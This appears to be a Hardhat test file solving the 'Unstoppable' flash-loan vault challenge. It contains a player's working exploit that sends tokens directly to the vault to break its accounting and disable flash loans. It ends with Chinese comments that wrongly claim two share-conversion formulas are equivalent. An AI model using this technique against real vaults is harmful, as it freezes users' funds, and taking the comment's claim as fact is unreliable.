const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser
    let token, vault, receiverContract

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        ;[deployer, player, someUser] = await ethers.getSigners()

        token = await (
            await ethers.getContractFactory('DamnValuableToken', deployer)
        ).deploy()
        vault = await (
            await ethers.getContractFactory('UnstoppableVault', deployer)
        ).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        )
        expect(await vault.asset()).to.eq(token.address)
        console.log('Vault address: ', vault.address)
        console.log('Token address: ', token.address)
        console.log('Asset address: ', await vault.asset()) // the same as token.address

        await token.approve(vault.address, TOKENS_IN_VAULT)
        await vault.deposit(TOKENS_IN_VAULT, deployer.address)

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT)
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT)
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT)
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT)
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(
            0
        )
        console.log(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n))
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
            50000n * 10n ** 18n
        )

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE)
        expect(await token.balanceOf(player.address)).to.eq(
            INITIAL_PLAYER_TOKEN_BALANCE
        )

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (
            await ethers.getContractFactory('ReceiverUnstoppable', someUser)
        ).deploy(vault.address)
        await receiverContract.executeFlashLoan(100n * 10n ** 18n)
    })

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // check the depoisit function
        await token.connect(player).approve(vault.address, 10n * 10n ** 18n)
        await vault.connect(player).deposit(1n * 10n ** 18n, player.address)
        expect(await vault.totalAssets()).to.eq(1000001n * 10n ** 18n)
        console.log(await vault.totalAssets())
        console.log(await vault.totalSupply())
        await vault.connect(player).deposit(1n * 10n ** 18n, player.address)
        console.log(await vault.totalAssets())
        console.log(await vault.totalSupply())
        await token.connect(player).transfer(vault.address, 1n * 10n ** 18n)
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted
    })
})

// 根据以下的例子，可以看出，shares 的计算方式中，`return shares;` 和 `shares = totalAssets() * shares / totalSupply();`是一样的这里

// 情况1：totalSupply = 0，shares = 100

// 函数1: return shares; -> 输出 100
// 函数2: return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply); -> 输出 100（因为 supply 为0）
// 情况2：totalSupply = 100，shares = 100，totalAssets() = 100

// 函数1: return shares; -> 输出 100
// 函数2: return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply); -> 输出 100 * (100 / 100) = 100
// 情况3：totalSupply = 200，shares = 500，totalAssets() = 200

// 函数1: return shares; -> 输出 500
// 函数2: return supply == 0 ? shares : shares.mulDivDown(totalAssets(), supply); -> 输出 500 * (200 / 200) = 500
